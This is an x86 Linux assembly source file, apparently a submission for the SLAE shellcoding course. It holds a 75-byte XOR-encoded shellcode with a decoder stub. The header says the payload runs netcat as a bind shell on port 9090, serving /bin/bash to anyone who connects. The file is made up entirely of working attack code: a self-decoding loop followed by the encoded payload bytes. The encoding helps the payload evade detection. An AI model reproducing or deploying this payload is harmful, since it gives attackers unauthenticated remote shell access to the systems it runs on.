;
; Linux x86
; Author:  thryb
; Date:    13-07-17
; Purpose: /bin/nc -lp 9090 -le/bin/bash + decoder for 0x7f XORed
; Size:    75 bytes
; ID:      SLAE-770
;


global _start

section .text

_start:
	jmp short call_dec

decoder:
	pop esi ; get addr of shell:

xordec:
	xor byte [esi], 0x7f ; xor 0x7f byte per byte
	jz shell ; if 0 jmp to shell
	inc esi
	jmp short xordec ; loop back

call_dec:

	call decoder
	; XORed 0x7f shellcode of /bin/nc -lp 9090 -le/bin/bash + 0x7f for jz
        shell: db 0x4e,0xbf,0x4e,0xad,0x2f,0x17,0x50,0x50,0x11,0x1c,0x17,0x50,0x1d,0x16,0x11,0xf6,0x9c,0x2f,0x17,0x1d,0x1e,0x0c,0x17,0x17,0x1d,0x16,0x11,0x50,0x17,0x52,0x13,0x1a,0x50,0xf6,0x99,0x2f,0x17,0x46,0x4f,0x46,0x4f,0x17,0x52,0x13,0x0f,0x5f,0xf6,0x98,0x2d,0x29,0x28,0x2c,0xf6,0x9e,0xcf,0x74,0xb2,0xff,0x7f
